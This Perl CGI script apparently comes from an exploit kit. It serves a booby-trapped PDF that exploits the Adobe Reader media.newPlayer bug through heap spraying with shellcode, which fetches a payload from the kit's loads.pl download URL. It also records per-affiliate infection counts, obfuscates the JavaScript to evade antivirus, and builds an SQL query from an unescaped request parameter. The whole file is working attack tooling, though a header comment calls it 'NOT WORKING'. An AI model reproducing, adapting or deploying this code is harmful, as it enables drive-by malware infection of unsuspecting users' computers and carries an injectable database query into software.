#!/usr/bin/perl

#
# Adobe Acrobat Reader newplayer exploit (Windows XP / Adobe Acrobat Reader =< 9.2)
# TESTED on Windows XP SP3 (en / fr) (adobe 9.1 / 9.2) NOT WORKING
# NOT FUD   
#

use CGI;
use DBI;
require "../config.pl";
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";

$q = new CGI;

$aff = $q->param('aff');

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit
$sql = "UPDATE exploits SET adobenewplayer=adobenewplayer+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET adobenewplayer=adobenewplayer+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#build the shellcode
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=adobenewplayer';
$shellcode = Shellcode::getshell($urlllll);
$NOP = '%u0d0d%u0d0d';
$chunks = 1200;

#randomize javascript variables
$spray_heap    = JsXOR::generate_random_string(int(rand 100));
$chunk_size    = JsXOR::generate_random_string(int(rand 100));
$payload       = JsXOR::generate_random_string(int(rand 100));
$nopsled       = JsXOR::generate_random_string(int(rand 100));
$nopsled_len   = JsXOR::generate_random_string(int(rand 100));
$heap_chunks   = JsXOR::generate_random_string(int(rand 100));
$i             = JsXOR::generate_random_string(int(rand 100));
$trigger_bug   = JsXOR::generate_random_string(int(rand 100));


sub genjavascript
{
$javascript = <<JAVA;
        function $spray_heap()
        {
            var $chunk_size, $payload, $nopsled;
            
            $chunk_size = 0x8000;
            $payload = unescape("$shellcode");
            $nopsled = unescape("$NOP");
            while ($nopsled.length < $chunk_size)
                $nopsled += $nopsled;
            $nopsled_len = $chunk_size - ($payload.length + 20);        
            $nopsled = $nopsled.substring(0, $nopsled_len);
            $heap_chunks = new Array();
            for (var $i = 0 ; $i < $chunks ; $i++)
                $heap_chunks\[$i\] = $nopsled + $payload;
        }    
         
        function $trigger_bug()
        {
            util.printd("1.000000000000000000000000 : 0000000", new Date());
            try {
                media.newPlayer(null);
            } catch(e) {}
            util.printd("1.000000000000000000000000 : 0000000", new Date());
        }
        
        $spray_heap();
        $trigger_bug();
JAVA

#obfuscate the javascript
$javascript = JsXOR::excryptxorjs($javascript);

return $javascript;
}

sub genpdf
{
$eol = "\n";

$pdf .= '%PDF-1.' . int(rand(6)) . $eol;
$pdf .= '1 0 obj' . $eol;
$pdf .= '<< /' . JsXOR::pdfhexencode("Type") . '/' . JsXOR::pdfhexencode("Catalog") . '/' . JsXOR::pdfhexencode("Outlines") . ' 2 0 R /' . JsXOR::pdfhexencode("Pages") . ' 3 0 R /' . JsXOR::pdfhexencode("OpenAction") . ' 5 0 R >>' . $eol;
$pdf .= 'endobj' . $eol;
$pdf .= '2 0 obj' . $eol;
$pdf .= '<< /' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("Outlines") . ' /' . JsXOR::pdfhexencode("Count") . ' 0 >>' . $eol;
$pdf .= 'endobj' . $eol;
$pdf .= '3 0 obj' . $eol;
$pdf .= '<< /' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("Pages") . ' /' . JsXOR::pdfhexencode("Kids") . ' [4 0 R] /' . JsXOR::pdfhexencode("Count") . ' 1 >>' . $eol;
$pdf .= 'endobj' . $eol;
$pdf .= '4 0 obj' . $eol;
$pdf .= '<< /' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("Page") . ' /' . JsXOR::pdfhexencode("Parent") . ' 3 0 R /' . JsXOR::pdfhexencode("MediaBox") . ' [0 0 612 792] >>' . $eol;
$pdf .= 'endobj' . $eol;
$pdf .= '5 0 obj' . $eol;
$pdf .= '<< /' . JsXOR::pdfhexencode("Type") . ' /' . JsXOR::pdfhexencode("Action") . ' /' . JsXOR::pdfhexencode("S") . ' /' . JsXOR::pdfhexencode("JavaScript") . ' /' . JsXOR::pdfhexencode("JS") . ' (' . $eol;
$pdf .= genjavascript();
$pdf .= <<EOF2;
) >>
endobj
xref
0 6
0000000000 65535 f
0000000010 00000 n
0000000096 00000 n
0000000145 00000 n
0000000205 00000 n
0000000279 00000 n
trailer
EOF2
$pdf .= '<< /' . JsXOR::pdfhexencode("Size") . ' 6 /' . JsXOR::pdfhexencode("Root") . ' 1 0 R >>' . $eol; 
$pdf .= 'startxref' . $eol; 

$pdf .= length($pdf) . $eol;
$pdf .= '%%EOF';

return $pdf;
}


$allpdfdata = genpdf();

###### BEGIN PRINT EXPLOIT #########
print $q->header(-type=> 'application/pdf', "Content-Disposition: inline; filename=player.pdf");

print $allpdfdata;


####### END PRINT EXPLOIT ##########

$dbh->disconnect();

1;
